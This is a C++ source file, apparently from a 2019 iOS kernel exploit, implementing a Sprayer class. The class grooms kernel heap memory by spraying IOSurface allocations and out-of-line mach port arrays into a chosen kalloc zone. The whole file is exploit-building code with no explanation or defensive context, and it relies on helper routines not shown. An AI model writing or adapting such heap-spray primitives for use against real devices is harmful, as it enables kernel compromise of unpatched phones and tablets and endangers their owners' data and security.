// <3 nedwill 2019
#include "spray.h"

extern "C" {
#include "iosurface.h"
#include "kernel_alloc.h"
}

static uint32_t kSprayCount = 32;
static uint32_t kFillerPortCount = 500;
const size_t kOOLSpraySize = 64000;

Sprayer::Sprayer() {}
Sprayer::~Sprayer() {}

bool Sprayer::Spray(void *data, uint32_t size, uint32_t count) {
  return IOSurface_spray_with_gc(/*array_count=*/kSprayCount,
                                 /*array_length=*/count, data, size,
                                 /*callback=*/nullptr);
}

bool Sprayer::SprayOOLPorts(size_t zone_size, mach_port_t ool_port) {
  for (size_t i = 0; i < kFillerPortCount; i++) {
    ool_holding_ports_.emplace_back(new OOLHoldingPort);
  }

  const size_t ool_port_count = zone_size / sizeof(uint64_t);
  for (size_t i = 0; i < ool_port_count; i++) {
    ool_ports_.push_back(ool_port);
  }

  size_t ool_holding_port_count = ool_holding_ports_.size();

  std::vector<mach_port_t> holding_ports;
  for (const std::unique_ptr<OOLHoldingPort> &port : ool_holding_ports_) {
    holding_ports.push_back(port.get()->get());
  }
  size_t sprayed_size = ool_ports_spray_size(
      holding_ports.data(), &ool_holding_port_count,
      message_size_for_kalloc_size(512), ool_ports_.data(), ool_port_count,
      MACH_MSG_TYPE_COPY_SEND, kOOLSpraySize);

  if (!sprayed_size) {
    return false;
  }

  return true;
}
